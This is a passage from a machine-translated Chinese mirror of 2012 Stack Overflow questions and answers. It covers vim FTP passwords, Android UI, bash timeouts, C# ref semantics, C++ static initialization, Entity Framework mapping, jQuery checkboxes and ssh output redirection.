当然，在开始测试之前，您需要将数据库模式创建到内存数据库中。例如，如果您使用 hibernate 或 JPA，那么这应该很简单（确保添加第二个持久性单元并在这种情况下使用它），如果没有，那么您应该拥有数据库的脚本并像您一样使用 JDBC 运行它们在任何数据库中运行它们。

此外，如果您不想在每次运行测试时都运行脚本，请使用 hsql 但在文件模式下（将 jdbc:hsqldb:mem 更改为 jdbc:hsqldb:file 它将使用文件来存储数据库）。

如果您想了解更多信息，这里有一些关于 hsql 数据库的信息：[link](http://hsqldb.org/doc/guide/running-chapt.html)

另外，如果您不喜欢 hsql，您可以尝试[sqlite](http://www.ch-werner.de/javasqlite/)（仅适用于文件模式），我认为它有更多访问它的工具

# vim - 你如何在vim中重置ftp密码？

> ID：11935110
> 
> 赞同：4
> 
> 时间：2012-08-13T13:22:02.717
> 
> 标签：vim, ftp

假设我想在 vim 中访问这个远程文件

`ftp://amr@steamboy//home/amr/bin/dr_snapshot.py`

并且，当出现提示时，我不小心输入了错误的密码。

如何重设密码？现在我必须退出并重新启动 vim。

客户端和服务器都在 Linux 上。

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-13T13:40:05.497

`:help netrw-userpass`

> > > ```
> > > Attempts to use ftp will prompt you for a user-id and a password.
> > > These will be saved in global variables |g:netrw_uid| and
> > > |s:netrw_passwd|; subsequent use of ftp will re-use those two strings,
> > > thereby simplifying use of ftp.  However, if you need to use a
> > > different user id and/or password, you'll want to call |NetUserPass()|
> > > first. 
> > > ```

即使用：

```
:call NetUserPass()                     -- prompts for uid and password 
```

PS。

vim 带有一个惊人的帮助系统。在这种情况下，我做了 `:h ftp`，做了搜索`password`，第一个命中是这个部分：

> > > 该脚本尝试使用|inputsecret()|，一个内置的Vim 函数，以不可见的方式获取ftp 的密码。见 |netrw-userpass| 设置密码后如何更改密码。

这给出了**netrw-userpass的条目**

顺便说一句，如果您迷路了，请执行 a`:h <SOME_STRING>`并按 CTRL-d，vim 会显示一个列表，其中包含包含该字符串的所有部分...

# java - 过渡不起作用

> ID：11935117
> 
> 赞同：0
> 
> 时间：2012-08-13T13:22:26.123
> 
> 标签：java, android, transition

Fadein.xml 文件：

```
<?xml version="1.0" encoding="utf-8"?>
    <alpha xmlns:android="http://schemas.android.com/apk/res/android"
       android:interpolator="@android:anim/accelerate_interpolator"
       android:fromAlpha="0.0" android:toAlpha="1.0" android:duration="500" /> 
```

淡出.xml

```
<?xml version="1.0" encoding="utf-8"?>
    <alpha xmlns:android="http://schemas.android.com/apk/res/android"
       android:interpolator="@android:anim/accelerate_interpolator"
       android:fromAlpha="1.0" android:toAlpha="0.0" android:duration="500" /> 
```

按下按钮时，主要活动类开始新活动：

`Intent myIntent = new Intent(this, OtherActivity.class); this.startActivity(myIntent);`

在 OtherActivity 类中：

```
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    overridePendingTransition(R.anim.fadein, R.anim.fadeout);
    setContentView(R.layout.view);    
} 
```

它不起作用 - 活动不会滑动，它只是立即打开。怎么了？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T13:28:00.993

如果活动只是立即打开，则可能有两种可能性...... 1）动画是从您运行/测试应用程序的设备或模拟器上的设置中禁用的，或者 2）动画时间也很短/更少意味着 500 毫秒，所以这可能就是为什么褪色效果看起来只是开场效果，但我认为第一点是你的主要问题。

是的，这也是亚历克斯在回答中提到的一点

overridePendingTransition() 方法应在 startActivity() 之后从与 startActivity() 方法相邻的同一活动中调用，而不是从目标活动中调用。

# vb.net - “电影打字”的 Word 宏

> ID：11935125
> 
> 赞同：1
> 
> 时间：2012-08-13T13:22:49.513
> 
> 标签：vb.net, ms-word

您知道在电影中，他们展示了演员“打字”（随机敲击键盘），然后屏幕上出现 Word 中的文本流。我想创建一个宏来实现这一点 - 所以它是基本的键盘捕获，然后一次显示提供的 word 文件。

请任何指向正确方向的指示！完全是 VB 编程的新手，但几年前我获得了计算机科学学位 - 由于缺乏使用而非常生疏！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T13:25:19.860

如果您使用命名空间“System.Windows.Forms”，则可以使用“SendKeys”类示例

```
SendKeys.Send("What the actor types?") 
```

[你可以在这里](http://msdn.microsoft.com/en-us/library/system.windows.forms.sendkeys.send.aspx)阅读更多 请注意，密钥被发送到 windows 上的前台窗口。

要更改前景窗口，您只需使用该功能

```
Public Declare Function SetForegroundWindow Lib "User32.dll" (ByVal window As IntPtr) As Boolean 
```

**请注意：** 调用“发送”功能后，计算机开始直接输入。如果您希望计算机延迟，例如 2 秒，您可以使用以下功能

```
System.Threading.Thread.Sleep(2 * 1000) 
```

# android - 在视图分页器之间插入分隔符

> ID：11935127
> 
> 赞同：7
> 
> 时间：2012-08-13T13:22:49.990
> 
> 标签：android, android-viewpager

我怎么能像在市场应用程序中一样在 view-pager 内的页面之间插入一些填充 - 黑线 ![在此处输入图像描述](../Images/b837052838e4c6e4ec346337d7c0ad58.png)

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2013-03-22T11:40:32.440

这对我有用。我只是设置了边距并用颜色填充了它。

```
viewPager.setPageMargin(20); // TODO Convert 'px' to 'dp'
viewPager.setPageMarginDrawable(R.color.black); 
```

编辑：要将 dp 转换为我使用的像素转换：

```
int px = Math.round(TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, 20, getResources().getDisplayMetrics()));
mViewPager.setPageMargin(px);
mViewPager.setPageMarginDrawable(R.color.black); 
```

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2012-08-13T13:29:33.837

那是被`ViewPager`称为边距的新api，可以找到指向它的链接[`setPageMargin()`](http://developer.android.com/reference/android/support/v4/view/ViewPager.html#setPageMargin%28int%29)。确保您使用的是最新的支持库。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-13T13:47:56.273

使用此方法：

```
public void setPageMarginDrawable (int resId) 
```

您将能够设置用于填充页面之间**边距**的可绘制对象。

# bash - 如何使用带有自己功能的超时命令？

> ID：11935130
> 
> 赞同：1
> 
> 时间：2012-08-13T13:22:55.627
> 
> 标签：bash, function, shell, timeout

我想将 timeout 命令与自己的功能一起使用，例如：

```
#!/bin/bash
function test { sleep 10; echo "done" }

timeout 5 test 
```

但是当调用这个脚本时，它似乎什么也没做。外壳在我启动后立即返回。

有没有办法解决这个问题，或者不能在自己的功能上使用超时？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-13T14:32:12.667

一种方法是做

```
timeout 5 bash -c 'sleep 10; echo "done"' 
```

反而。虽然你也可以[破解这样的东西](http://mywiki.wooledge.org/BashFAQ/068)：

```
f() { sleep 10; echo done; }
f & pid=$!
{ sleep 5; kill $pid; } &
wait $pid 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-13T13:28:34.690

`timeout`似乎不是内置命令，`bash`这意味着它无法访问功能。您必须将函数体移动到一个新的脚本文件中并将其`timeout`作为参数传递。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-13T13:28:43.920

`timeout`需要一个命令并且不能在 shell 函数上工作。

不幸的是，您上面的函数与可执行文件有名称冲突`/usr/bin/test`，这会导致一些混乱，因为它会`/usr/bin/test`立即退出。如果您将函数重命名为 (say) `t`，您将看到：

```
brian@machine:~/$ timeout t
Try `timeout --help' for more information. 
```

这不是很有帮助，但可以说明正在发生的事情。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-11-10T05:06:26.557

自己尝试实现这一目标时发现了这个问题，并根据@geirha的回答工作，我得到了以下工作：

```
#!/usr/bin/env bash
# "thisfile" contains full path to this script
thisfile=$(readlink -ne "${BASH_SOURCE[0]}")

# the function to timeout
func1()
{ 
  echo "this is func1"; 
  sleep 60
}

### MAIN ###
# only execute 'main' if this file is not being source
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
   #timeout func1 after 2 sec, even though it will sleep for 60 sec
   timeout 2 bash -c "source $thisfile && func1"
fi 
```

由于`timeout`执行它在新 shell 中给出的命令，因此诀窍是让该子 shell 环境获取脚本以继承您要运行的函数。第二个技巧是让它有点可读......，这导致了`thisfile`变量。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-13T13:46:53.277

如果您将函数隔离在单独的脚本中，则可以这样做：

```
(sleep 1m && killall myfunction.sh) & # we schedule timeout 1 mn here
myfunction.sh 
```

# c# - 与 C++ 相比，C# 'ref' 关键字的使用

> ID：11935140
> 
> 赞同：10
> 
> 时间：2012-08-13T13:23:39.593
> 
> 标签：c#, c++

我主要在 C++ 中工作，现在在我的新工作中使用 C#，在这里阅读了一些关于 'ref' 关键字和 c# 值与引用类型的内容后，我仍然发现它们有些混淆。

据我了解，如果您将这些传递给方法，这些将是类似的 C++ 样式：

**值类型：**

```
public void CSharpFunc(value) 
```

和

```
public void CPlusplusFunc(value) 
```

**参考类型：**

```
public void CSharpFunc(reference) 
```

和

```
public void CPlusPlusFunc(&reference) 
```

**“参考”/指针**

```
public void CSharpFunc(ref bar) 
```

和

```
public void CPlusPlus(*bar) 
```

这是一个正确的类比吗？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-13T13:39:02.927

> 这是一个正确的类比吗？

尽管其他答案说，不。C ++`ref`的含义实际上取决于类型。对于值类型，您的评估是正确的（或足够接近）。对于引用类型，更合适的类比是引用指针：

```
public void CPlusPlus(type*& bar) 
```

重点`ref`是您可以*更改*传入的引用。而在 C++ 中，您不能通过简单地传递一个指针来做到这一点：

```
void f(type* bar) {
    bar = new_address;
}

type* x;
f(x); 
```

此代码不会更改调用方的`x`. 另一方面，如果你传递了`bar`as ，它*就会*改变值。就是这样。`type*&`*`ref`*

 *此外，C# 中的引用与 C++ 中的引用完全不同，更像 C++ 中的指针（因为您可以更改引用所指的对象）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-13T13:39:37.650

交换“参考类型”和“ ”示例会更准确（尽管仍然不*完全相同）。*`ref`

在 C# 中，**引用类型**是始终通过对该类型实例的引用在内部访问的类型。在 C++ 意义上，将这些作为“指针”是最简单的：分配内存，运行构造函数，并取回一个间接引用所需对象的值。这里 C# 和 C++ 的区别在于，在 C# 中，这是*type*的属性，而不是*variable*的属性。类型要么*总是*引用类型，要么*总是*一个值类型。这样做的一个效果是您不必执行任何特殊操作即可使用引用类型（托管 C# 代码中没有“取消引用”运算符）；编译器假定引用类型变量访问是间接的。在 C++ 中，您仍然需要使用`->`运算符，因为您可以同时拥有相同类型的值和引用变量（`object x`vs. `object *x`）。

`ref`关键字用于通过引用传递参数；这些参数可以是值类型（如`int`）或引用类型。虽然`ref`关键字的实现最终是一个地址/指针类型操作（就像`&`在 C++ 中一样），但`ref`(and `out`) 会产生一种特殊类型的对象，称为***托管引用***，它不同于引用类型，因为您可以有对值类型的托管引用。这几乎正​​是 C++ 的工作方式：an`int&`是一种特殊类型的“对 int 的引用”，与 不同`int *`，尽管两者基本上都使用指针间接访问变量。同样，在 C# 中，您可以拥有一个`ref Object`，这实际上是一个`object *&`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-13T13:34:01.540

是的，你基本上是正确的，（s/*/*& 并且你 100% 在那里）。正如@weston 提到的，`out`是一个需要熟悉的附加关键字。您可以做的唯一可爱的事情`ref`是重载一个不是 ref 的函数。

```
class Person {
   string Name { get; set; }
   string Address { get; set; }
   int age { get; set; }
}

public void UpdateName(Person p)
{
   if (p == null) 
   {
      return;
   }

   p.Name = "Tom";
}

public void UpdateName(ref Person p)
{
   if (p == null)
   {
      p = new Person();
   }

   p.Name = "Tom";
} 
```

显然没用，但它确实提供了一些有趣的机会（和糟糕的设计）。 `out`不提供相同的重载功能。

如果您想要 1 对 1，您可以随时使用`unsafe`.*

# c++ - cpp文件中的全局变量

> ID：11935141
> 
> 赞同：2
> 
> 时间：2012-08-13T13:23:40.463
> 
> 标签：c++, c++11, access-violation

我在匿名命名空间中有一个全局变量。

```
namespace {
std::unordered_map<std::string, std::string> m;
}

A::A() { m.insert(make_pair("1", "2")); } // crasches
void A::insert() { m.insert(make_pair("1", "2")); } // ok 
```

如果尝试使用`map`内部构造函数，我会得到*访问冲突*读取位置。但是如果我`A`在初始化后使用它，它就可以工作。
这种行为正确吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-13T13:29:57.767

`A`其构造函数调用导致崩溃的对象的范围是什么？

无法保证静态初始化程序的执行顺序，因此，如果您的`A`对象也是全局或静态的（按原样`m`），那么就作为有效构造的对象而言，它很可能`m`还不存在，这意味着您的调用`std::unordered_map::insert()`将在未初始化的内存上调用，从而导致您的崩溃。

一个解决方案是确保您`A`所依赖的所有实例`m`都是由您显式构建的，而不是静态/全局构建的（或者正如评论者所添加的，如果它们在同一个 TU 中，则正确地对它们进行排序），或者更改结构`A`这样您就可以稍后在实例上调用函数以进行插入。这是否是一个有效的解决方案更多地取决于`A`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-13T13:31:39.777

您可能正在`A`应用程序某处的静态上下文中创建一个类型类，即在您的`main()`函数执行之前，因此 before`m`已被初始化。

# c# - 如何使一个实体上的 EF 映射 NavigationProperty 到另一个实体的集合

> ID：11935144
> 
> 赞同：0
> 
> 时间：2012-08-13T13:23:48.800
> 
> 标签：c#, .net, entity-framework-4.1

我想要两个实体之间的直接外键关系，EF 属性是双向的。但是，目前 EF 正在生成 2 个表示关系每个方向的外键。如何让 EF 将它们视为单一属性？下面生成两个数据库外键约束，分别命名为 Script_ScriptRuns 和 ScriptRun_Script，分别使用外键字段 Script_Id 和 Script_Id1

```
public class Script
{
    [Key]
    public Guid Id { get; set; }

    public virtual ICollection<ScriptRun> ScriptRuns { get; set; }
}

public class ScriptRun
{
    [Key]
    public Guid Id { get; set; }

    [Required]
    public virtual Script Script { get; set; }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T13:32:11.963

使用您发布的代码，它只为我创建了一个 FK - 类中的 Script_Id `ScriptRun`。

您是否只是想重命名在该类中创建的 FK？您可以通过映射 DbContext 中的列来做到这一点。这会将其映射到 ScriptId：

```
 modelBuilder.Entity<Script>()
            .HasMany(s => s.ScriptRuns)
            .WithRequired(sc => sc.Script)
            .Map(x => x.MapKey("ScriptId")); 
```

如果没有，您可以发布您的整个模型吗？

# javascript - 深层链接 div 块

> ID：11935145
> 
> 赞同：0
> 
> 时间：2012-08-13T13:23:51.043
> 
> 标签：javascript, html, browser-history

我正在寻找一种深度链接 div 块的方法。在特定页面上，我可能有几个 div 块，每个块都有自己的内容。其中一个块是可见的，其他块是隐藏的。按下链接或按钮后，会显示相应的 div 并隐藏其他 div。这是 div 的 HTML：

```
<div id="6ba28aae2dae153a1686cfee276632d8" class="page-block" style="display: block;">
    <p>
    1st block. 
    </p>        
</div>
<div id="55cead0effa915778913d8667d0ae3a9" class="page-block" style="display: none;">
    <p>
    2nd block. 
    </p>
</div> 
```

这是用于切换块的 JavaScript。

```
/* Hide and show necessary blocks. */
function switchBlocks(UID)
{
    var blocks = $('div.page-block');

    for (i=0; i<blocks.length; i++) 
    {
        if (blocks[i].id == UID) 
        {
            blocks[i].style.display= 'block';

            // Get the current URL and split it at the # mark
            urlArray = window.location.href.split("#");
            // Select the part before #
            subURL = urlArray[0];
            // Create a fake URL by adding UID to subURL
            history.pushState(null, null, subURL + '#' + UID);
        } 
        else 
        {
            blocks[i].style.display= 'none';
        }
    }
} 
```

我现在要做的是使用块 ID 为每个块分配其唯一的 URL。我能够使用相关 ID 更新 URL，但无法弄清楚如何将特定 URL 链接到特定块，以便在访问其 URL 时显示相应的块。

我已经研究了[HTML5 History API](http://html5doctor.com/history-api/)的教程，但不太清楚如何将它应用到我的案例中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T13:31:21.493

```
if(window.location.hash == "#55cead0effa915778913d8667d0ae3a9")
{
 $("div.page-block").hide();
 $("div#55cead0effa915778913d8667d0ae3a9").show();
} 
```

或者

```
hash_id = window.location.hash;
if(hash_id.length > 0)
{
 $("div.page-block").hide();
 $(hash_id).show();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T13:44:20.907

我认为添加和删除类然后具有所需的 css 效果会更好。我相信这更有效，但我可能是错的。

您还可以存储对正在显示的旧 div 的引用，以便您可以隐藏那个并显示另一个，而不是遍历整个 div 列表。实际上，您只需要显示一个 div 并隐藏一个 div。

至于浏览器历史记录支持。您需要跨浏览器支持吗？并非所有浏览器都支持 html5 历史 API。这对您来说可能不是问题或担忧。

**支持的浏览器列表**
[http://caniuse.com/#search=history](http://caniuse.com/#search=history)

我已经使用**jquery bbq**向 Web 应用程序添加历史记录支持。它在较旧的浏览器中运行良好。
[http://benalman.com/projects/jquery-bbq-plugin/](http://benalman.com/projects/jquery-bbq-plugin/)

对于大型 javascript 项目，Backbone.js 是可行的方法，它支持浏览器历史记录以及许多其他有用的内置函数，可以轻松管理您的代码库。

# url - 需要一种在根目录中抓取任何错误页面的 URL 的方法

> ID：11935150
> 
> 赞同：0
> 
> 时间：2012-08-13T13:24:12.210
> 
> 标签：url, monitor

我需要一种方法来每隔一段时间（5 分钟）检查我的根目录和其中包含的所有网页是否有任何错误页面。

我有一个程序可以检查特定的服务器或 IP 地址以查看它们是否已启动或已关闭，如果它们已关闭，它会提醒我，这非常有用。我还可以通过发送 GET 请求并检查响应来检查特定网页是打开还是关闭，但我需要更自动和更彻底的东西。

是否有一个程序可以爬取给定根目录中的所有 URL 并检查每个页面的状态，然后报告任何已关闭的页面并且可以在给定的时间间隔内执行此操作（比如每 5 分钟、10 分钟...）？

谢谢！

TS。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-15T20:45:21.963

您可以使用[www.downnotifier.com 之](http://www.downnotifier.com)类的工具，但您必须添加每个单独的 URL。我不知道能够爬行的工具。

# javascript - IE7 文本大小调整

> ID：11935156
> 
> 赞同：1
> 
> 时间：2012-08-13T13:24:29.907
> 
> 标签：javascript, html, css

我使用像素来确定网站上字体的大小。使用缩放功能，所有文本在 Chrome、Firefox 等中都可以很好地调整大小。但是在 IE7（和 IE6/8，我猜）中，字体不会使用“文本大小”菜单调整大小，它们只是保持不变。

现在我在想唯一的解决方案是切换到`ems`- 但是我可以用 JS 编写任何解决方案来定位/修复 IE 吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T13:37:51.307

除非您另有了解，否则假设几乎没有人拥有 IE7 或 6。IE8 有缩放功能，所以没关系。在我掌握的大约 50 个小型企业网站上，上个月有 0.5% 的访问者使用 IE6，4% 使用 IE7，12% 使用 IE8。

我们不支持 IE6 或 7，但我们会进行测试并检查事情看起来基本上就在那里。

假设你确实想在 IE6 和 7 中允许这个小功能（假设最需要可访问性的人不会使用这些臭名昭著的不可访问的浏览器！），你确实需要使用 ems 而不是 px，你真的需要将它用于所有内容，而不仅仅是字体大小，否则框也无法正确缩放。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T13:47:12.467

在 Internet Explorer 6 和 7 中，您不能增加或减少在 CSS 中以像素为单位设置的字体大小。

为此，您必须使用 EM 作为字体大小值。

[阅读这篇文章](http://www.alistapart.com/articles/howtosizetextincss/)

# linux - 如何将 ssh 的输出发送到 /dev/null

> ID：11935157
> 
> 赞同：0
> 
> 时间：2012-08-13T13:24:33.763
> 
> 标签：linux, bash, shell

我有一个命令想用 ssh 连接远程服务器。我的命令是

```
"ssh -o PasswordAuthentication=no $REMOTE_HOST_IP > /dev/null 2>&1" 
```

当这有效时，真正的消息来了“权限被拒绝”。这是真正的消息，但我不想在控制台上看到消息，所以我将它重定向到 /dev/null。但仍然出现。问题是什么

编辑：我按照你说的尝试过，在 /dev/null 之前取了 2&1 但它仍然不起作用。但奇怪的是它可以在我朋友的电脑上运行

已解决：问题是我将命令分配给一个变量并将其作为 $command 运行。但是当它设置在“”之间时，重定向不起作用

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T13:29:20.963

看`-n`选项

> ```
> -n      Redirects stdin from /dev/null (actually, prevents reading from
>          stdin).  This must be used when ssh is run in the background.  A
>          common trick is to use this to run X11 programs on a remote
>          machine.  For example, ssh -n shadows.cs.hut.fi emacs & will
>          start an emacs on shadows.cs.hut.fi, and the X11 connection will
>          be automatically forwarded over an encrypted channel.  The ssh
>          program will be put in the background.  (This does not work if
>          ssh needs to ask for a password or passphrase; see also the -f
>          option.) 
> ```

甚至在`-N`

> ```
>  -N      Do not execute a remote command.  This is useful for just for‐
>          warding ports (protocol version 2 only). 
> ```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T13:28:52.147

尝试

```
ssh -o PasswordAuthentication=no $REMOTE_HOST_IP &>/dev/null 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T13:25:44.850

试试这个（在将`2>&1`重定向标准错误发送到 /dev/null 之前移动它）：

```
 "ssh -o PasswordAuthentication=no $REMOTE_HOST_IP 2>&1 > /dev/null" 
```

请注意，您正在使用`2>&1`. 如果您只想将 stderr 重定向到 /dev/null ，那么只需使用`2> /dev/null`.

[关于IO 重定向的](http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO-3.html)好信息在这里。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-13T13:27:37.037

`ssh -o PasswordAuthentication=no $REMOTE_HOST_IP 2> /dev/null`

# javafx - javafx 2.1 中 com.sun.javafx.runtime API 的替代品是什么？

> ID：11935160
> 
> 赞同：1
> 
> 时间：2012-08-13T13:24:49.077
> 
> 标签：javafx, javafx-2

我正在将代码从 javafx 1.3 转换为 javafx 2.1。但我面临这个问题。所以请帮助我。提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T16:51:45.447

JavaFX 1.3 javafx.runtime 包中唯一的东西是对平台条件特性的测试。

对于 JavaFX 2.1，[javafx.application.Platform.isSupported(ConditionalFeature)](http://docs.oracle.com/javafx/2/api/javafx/application/Platform.html#isSupported%28javafx.application.ConditionalFeature%29)方法是等效的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-03-14T13:52:09.337

采用

```
Platform.runLater(new Runnable() {
    @Override
    public void run() {
        javafxuicomponent.setText("text to display");
    }
}); 
```

代替

```
Entry.deferAction(new Runnable() {
    @Override
    public void run() {
        fxListener.onMessage(line);
    }
}); 
```

# class - mootools 类中“this”的范围

> ID：11935162
> 
> 赞同：0
> 
> 时间：2012-08-13T13:24:54.600
> 
> 标签：class, events, scope, mootools, this

我正在尝试在 Mootools 类中定义一个单击处理程序。我的处理程序假定打开一个链接块，每个链接都应该“配备”自己的点击处理程序，这应该触发一个链接特定的操作。我的意思是假设我有以下 HTML 代码：

```
<div id="wrapper">
  <a href="#" id="header">open options</a>
  <div class="optionsBlock" style="display:none">
    <a href="#">1</a>
    <a href="#">2</a>
    <a href="#">3</a>
  </div>
</div> 
```

然后我试图在 Mootools 中定义一个这样的类：

```
var myHandler = new Class({
  Implements : [Events],
  initialize : function(element){
    this.element = document.id(element);
    this.elements = this.element.getChildren('a');
    this.elements.addEvents('click', function(ev){
      ev.preventDefault();
      //'this' as a reference to the current element in the array, which is being clicked, correct?
      this.getSibling('div.optionsBlock').setStyle('display', 'block');
      var parentLink = this;
      this.getSibling('div.optionsBlock').getChildren('a').addEvent('click', function(e){
        e.preventDefault();
      //should append the text of currently clicked link into the parent link
        parentLink.appendText(this.get('text'))
      });
    });
  }
});
new myHandler('wrapper'); 
```

这只是我想象的代码应该是什么样子的一个说明（我确信这段代码一点都不好），但我真的需要一些关于以下方面的帮助：

1.  由于添加新事件会不断更改“this”的范围，我应该如何保持对类实例和被单击元素的引用？

2.  我应该如何修改类，以免在初始化方法中包含整个代码？我试图为每个事件处理程序创建单独的方法，但结果我对“this”的范围感到困惑，绑定并试图将所有这些放在一起真的让我很恼火，但我想掌握这些知识.

3.  在类中添加嵌套事件处理程序时如何跟踪“this”的范围？老实说，我用谷歌搜索并寻找答案，但无济于事。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T13:52:54.960

范围，选择 - 多次询问 - 在此处搜索`[mootools]scope this`：

[Mootools 类变量范围](https://stackoverflow.com/questions/10385560/mootools-class-variable-scope)

[mootools 变量范围](https://stackoverflow.com/questions/4792508/mootools-variable-scope)

[Mootools - 绑定到类实例并访问事件对象](https://stackoverflow.com/questions/3468926/mootools-bind-to-class-instance-and-access-event-object)

回顾一下：

1.  使用保存的参考`var self = this;`，然后参考`self.prop`或使用`fn.bind`模式
2.  添加更多方法。遵循单一责任原则。例如，在您的班级中，创建`attachEvents: function() {}`并初始化调用它。
3.  通过使用保存的参考图案。您可以通过委派事件而不是在父点击上创建新的事件回调来修复它。

# javascript - 使用javascript获取复选框的状态

> ID：11935163
> 
> 赞同：3
> 
> 时间：2012-08-13T13:24:55.110
> 
> 标签：javascript, jquery, checkbox

我正在尝试使用 jquery 编写一个 javascript，它应该能够挑选并使用有关是否选中复选框的信息。每次单击复选框（具有 id 'edit-toggle-me'）时都会发生这种情况。我为此编写了一个测试函数，其中包含一些 alert() 来查看我是否成功。

```
(function ($) {
    "use strict";
    $(document).ready(function () {

        $('#edit-toggle-me').click(function(){

            if ($('#edit-toggle-me').checked()) {
                alert('Yup!');
            }
            else {
            alert('Nup!');
            }

        });
    });

})(jQuery); 
```

它不执行任何警报，所以我猜它会在 $('#edit-toggle-me').checked() 处崩溃。我不知道为什么。

我也试过这个：

```
(function ($) {

    $(document).ready(function () {

        $('#edit-toggle-me').click(function(){
            var elementy = document.getElementById('edit-toggle-me');
            var check = elementy.value;
            alert(check);
            if(elementy.checked()) {
                alert('yup');
            }
        });
    });
})(jQuery); 
```

第一个警报有效，但最后两个“yup”或“nup”都没有。

然后我也试过这个：

```
(function ($) {

     $(document).ready(function () {

        $('#edit-toggle-me').click(function(){

            var element2 = document.getElementById('edit-toggle-me');
            var check = element2.value;
            alert(check);

        });
    });
   })(jQuery); 
```

这总是返回 1。我也不明白为什么。

感谢任何提示。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-13T13:27:13.477

使用`.is(':checked')`. [您可以在此处](http://api.jquery.com/checked-selector/)找到文档。

[**JSFIDDLE**](http://jsfiddle.net/9LATV/)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-13T13:27:08.920

`.checked()`在 jQuery 或 DOM API 中没有这样的方法。元素上只有一个`.checked`属性，`true`如果元素被选中，`false`否则。试试这个：

```
(function ($) {
    "use strict";
    $(document).ready(function () {

        $('#edit-toggle-me').click(function(){
            alert( this.checked ? ":)" : ":(" );
        });
    });

})(jQuery); 
```

见演示：http: [//jsfiddle.net/scZ3X/](http://jsfiddle.net/scZ3X/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-13T13:54:44.243

```
$(function(){
    $('#edit-toggle-me').on('change', function(){
        if($(this).is(':checked')) {
            alert('checked');
        }
        else {
            alert('unchecked');
        }
    });
}); 
```

**您应该使用*“更改”事件****而不是单击*。因为在某些情况下，单击事件不适合在复选框和单选按钮中使用。

**示例 1：**

如果你有一个单选按钮有点击事件绑定。如果您的单选按钮已经为真并且您单击单选按钮。它不会改变单选按钮的值，但你的点击事件每次都会触发。

但是，如果您使用更改事件。只有当您的单选按钮值发生更改时，您的事件才会触发（如果它尚未选中或为真）

**示例 2：** 如果您有任何单选按钮或复选框的标签。如果您在复选框或单选按钮中有单击事件绑定。单击您的标签时，您的复选框或单选按钮值会发生变化，但您的点击事件不会调用。

万一发生变化。单击标签相关标签时，它也会按预期工作。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-13T13:31:52.507

试试这个：

```
$('#edit-toggle-me').is(':checked') 
```

# macos - av_interleaved_write_frame 中的内存泄漏

> ID：11935164
> 
> 赞同：0
> 
> 时间：2012-08-13T13:24:55.320
> 
> 标签：macos, ffmpeg

在我的 OSX 视频录制应用程序中，我使用的是 ffmpeg 库。我发现应用程序中很少有内存泄漏。在解决它的过程中，我发现有一些泄漏

int av_interleaved_write_frame(AVFormatContext *s, AVPacket *pkt)

有没有人遇到过这样的问题？你能帮我解决这个内存泄漏吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T13:31:18.467

当您使用像 ffmpeg 这样非常常见的库时，并且您面临内存泄漏，大多数情况下泄漏不在您使用的库中，而是在您编写的代码中的某个地方。

这是解决内存泄漏问题的第一步。

如果您绝对确定问题来自 FFMPEG，请查看[项目的未解决问题](https://ffmpeg.org/trac/ffmpeg/report)

然后如果问题没有打开，你可以将错误提交给开发团队......但在做之前检查几次错误不在你身边，再次，在像 FFMPEG 这样的非常常见的库中，我不要认为错误出在函数 av_interleaved_write_frame 中。

为什么你认为这个函数有 bug？

# silverlight - WP7：动态地将 UIElements 添加到 LongListSelector 项

> ID：11935165
> 
> 赞同：0
> 
> 时间：2012-08-13T13:24:56.640
> 
> 标签：silverlight, windows-phone-7, data-binding, datatemplate, longlistselector

我正在尝试以编程方式将`UIElement`s 添加到`LongListSelector`项目中。我已经为页眉、页脚、项目等创建了模板。

现在我正在做这样的事情（列表项模板）：

```
<DataTemplate x:Key="listItemTemplate">
     <ContentPresenter Content="{Binding ItemContent}"></ContentPresenter>
</DataTemplate> 
```

在模型内部，我将 ItemContent 分配给一个网格，在该网格上添加不同的 UI 元素。我真的不知道这是否是这样做的方法，或者这是否可能在 LongListSelector 上但滚动列表时我得到一个“参数不正确”。异常（起初，一切似乎都很好，添加的所有元素看起来都很好）。我尝试了不同的方法，但都没有奏效，我觉得我只是在没有特定想法的情况下随机尝试解决方案。有没有人设法通过使用 LongListSelector 做到这一点（任何建议将不胜感激）？

调用堆栈：

